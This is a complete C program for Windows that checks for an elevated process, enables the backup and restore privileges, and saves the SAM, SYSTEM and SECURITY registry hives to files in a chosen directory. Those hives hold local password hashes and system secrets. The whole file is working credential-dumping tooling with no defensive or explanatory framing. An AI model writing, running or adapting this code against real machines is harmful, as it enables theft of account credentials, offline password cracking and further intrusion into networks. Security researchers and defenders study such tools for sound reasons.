#include <stdio.h>
#include <windows.h>

BOOL DumpRegKey(char *key, char *outputDir, char *fileName) {
    HKEY hKey;
    LONG result;
    char fullPath[MAX_PATH];

    // Construct the full output path with proper separator
    snprintf(fullPath, sizeof(fullPath), "%s\\%s", outputDir, fileName);

    // Open the registry key with backup/restore options
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        key,
        REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK,
        KEY_READ | KEY_WOW64_64KEY,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        printf("Failed to open registry key: HKLM\\%s. Error code: %lu\n", key, result);
        return FALSE;
    }

    // Save the registry key to a file
    result = RegSaveKey(hKey, fullPath, NULL);
    if (result != ERROR_SUCCESS) {
        printf("Failed to save registry key: HKLM\\%s. Error code: %lu\n", key, result);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);
    printf("Exported HKLM\\%s to %s.\n", key, fullPath);
    return TRUE;
}

BOOL EnablePrivilege(HANDLE tokenHandle, LPCSTR privilegeName) {
    TOKEN_PRIVILEGES tokenPrivileges;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, privilegeName, &luid)) {
        printf("LookupPrivilegeValue failed - Error code %lu\n", GetLastError());
        return FALSE;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("AdjustTokenPrivileges failed - Error code: %lu\n", GetLastError());
        return FALSE;
    }
    if (GetLastError() != ERROR_SUCCESS) {
        printf("AdjustTokenPrivileges did not successfully enable privilege - Error code: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL IsHighIntegrity() {
    HANDLE tokenHandle;
    BOOL result = FALSE;
    TOKEN_ELEVATION tokenElevation;
    DWORD tokenSize;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
        if (GetTokenInformation(tokenHandle, TokenElevation, &tokenElevation, sizeof(tokenElevation), &tokenSize)) {
            result = tokenElevation.TokenIsElevated;
        }
        CloseHandle(tokenHandle);
    }

    return result;
}

void usage(char *program) {
    printf("Usage:\t%s <path to write the keys>\n", program);
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        usage(argv[0]);
    }

    // Verify if the output directory is valid
    DWORD ftyp = GetFileAttributesA(argv[1]);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        printf("Invalid output directory: %s\n", argv[1]);
        return 1;
    }

    if (!IsHighIntegrity()) {
        printf("The process is NOT running with high integrity.\n");
        return 1;
    }

    HANDLE tokenHandle;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        printf("Could not open the process token.\n");
        return 1;
    }

    if (!EnablePrivilege(tokenHandle, SE_BACKUP_NAME) || !EnablePrivilege(tokenHandle, SE_RESTORE_NAME)) {
        printf("Failed to enable required privileges.\n");
        CloseHandle(tokenHandle);
        return 1;
    }

    // Use the updated DumpRegKey function with proper output path
    if (!DumpRegKey("SAM", argv[1], "sam_dump.txt") ||
        !DumpRegKey("SYSTEM", argv[1], "system_dump.txt") ||
        !DumpRegKey("SECURITY", argv[1], "security_dump.txt")) {
        printf("Failed to dump some registry keys.\n");
    }

    CloseHandle(tokenHandle);
    return 0;
}
